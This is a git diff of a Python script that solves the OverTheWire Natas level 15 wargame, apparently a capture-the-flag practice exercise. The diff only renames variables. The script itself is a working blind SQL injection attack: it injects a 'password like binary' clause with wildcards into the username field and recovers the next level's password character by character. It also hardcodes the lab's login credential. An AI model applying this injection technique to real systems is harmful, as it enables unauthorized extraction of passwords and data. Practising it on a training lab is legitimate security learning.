@@ -5,31 +5,31 @@ import requests
 natas15 = "http://natas15.natas.labs.overthewire.org"
 auth = ('natas15', '7h15154h3lL0f4p455w0rD')
 
-chlist = string.letters + string.digits
+valid_chars_list = string.letters + string.digits
 
-st = ''
+password = ''
 base_string = 'natas16" and password like binary "'
 
-out_form = base_string + st + '_%'
+out_form = base_string + password + '_%'
 payload=dict(username=out_form)
-r = requests.post(natas15, data=payload, auth=auth)
-out = r.text
+response = requests.post(natas15, data=payload, auth=auth)
+out = response.text
 
 while('exists' in out):
-    for ch in chlist:
-        print st + ch
-        out_form = base_string + st + ch + '%'
+    for ch in valid_chars_list:
+        print password + ch
+        out_form = base_string + password + ch + '%'
         payload=dict(username=out_form)
-        r = requests.post(natas15, data=payload, auth=auth)
-        out = r.text
+        response = requests.post(natas15, data=payload, auth=auth)
+        out = response.text
         if 'exists' in out:
-            st = st + ch
+            password = password + ch
             break
 
-    out_form = base_string + st + '_%'
+    out_form = base_string + password + '_%'
     payload=dict(username=out_form)
-    r = requests.post(natas15, data=payload, auth=auth)
-    out = r.text
+    response = requests.post(natas15, data=payload, auth=auth)
+    out = response.text
 print "Done and done."
     
 exit(0)
